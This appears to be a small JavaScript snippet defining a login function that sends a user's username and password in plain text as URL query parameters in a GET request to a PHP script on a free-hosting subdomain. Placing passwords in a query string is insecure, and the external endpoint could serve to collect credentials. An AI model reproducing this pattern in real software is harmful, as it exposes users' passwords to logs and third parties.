const { default: axios } = require("axios")

export const loginRequest = (req) => {
    return axios.get(`https://marvelous-valley.000webhostapp.com/temp.php?login=${req.username}&pass=${req.password}`)
}
